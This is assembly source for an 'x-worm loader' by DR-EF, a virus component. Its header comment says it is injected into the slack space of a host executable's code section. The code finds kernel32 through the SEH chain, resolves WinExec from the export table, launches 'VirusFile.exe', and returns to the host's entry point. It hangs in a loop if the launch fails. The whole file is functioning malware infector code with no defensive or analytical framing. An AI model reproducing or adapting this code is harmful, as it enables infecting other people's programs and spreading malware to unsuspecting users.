;x-worm loader by DR-EF
;----------------------------------
;that code is injected into the aligned space
;of the host code section,its find kernel32 by
;using SEH walker & than its find winexec api
;after all of that its execute the host & jump
;back to host entry point,if the virus file
;canot be executed its wont jump to host EP

.386
.model flat

	extrn	ExitProcess:proc

.data

	db	?
	
.code


_loader_start:
	
	jmp	LoaderStart

	db	"LOADER-START"
LoaderStart:
	pushad
        mov eax,fs:[0]
search_last:
        mov edx,[eax]
        inc edx
        jz found_last
        dec edx
        xchg edx,eax
        jmp search_last
found_last:
        mov eax,[eax+4]
        and eax,0ffff0000h
search_mz:
        cmp word ptr [eax],'ZM'
        jz found_mz
        sub eax,10000h
        jmp search_mz
found_mz:
;find WinExec
	mov	ebp,eax
	add	eax,[eax + 3ch]
	mov	eax,[eax + 78h]
	add	eax,ebp					;eax - kernel32 export table
	push	eax
	xor	edx,edx
	mov	eax,[eax + 20h]
	add	eax,ebp
	mov	edi,[eax]
	add	edi,ebp					;edi - api names array
	dec	edi
NxtCmp:	inc	edi
	call	OverWC
	db	"WinExec",0
OverWC:	pop	esi
	mov	ecx,8h
	rep	cmpsb
	je	GetWC
	inc	edx
Nxt_1:	cmp	byte ptr [edi],0h
	je	NxtCmp
	inc	edi
	jmp	Nxt_1
GetWC:	pop	eax					;eax - kernel32 export table
	shl	edx,1h					;edx - GetProcAddress position
	mov	ebx,[eax + 24h]
	add	ebx,ebp
	add	ebx,edx
	mov	dx,word ptr [ebx]
	shl	edx,2h
	mov	ebx,[eax + 1ch]
	add	ebx,ebp
	add	ebx,edx
	mov	ebx,[ebx]
	add	ebx,ebp					;Winexec !
	push	1h
	call	ExeF
	db	"VirusFile.exe",0
	FileNameOffset2		equ	($-LoaderStart-13)
ExeF:	call	ebx
Punish:	cmp	eax,31
	jb	Punish
ReturnToProgram:
	popad
	push	offset Host
	HostEntry	equ	($-LoaderStart-4)
	ret

EndOfLoader	equ	$
	db	"LOADEREND"
	
Host:	push	eax
	call	ExitProcess

end _loader_start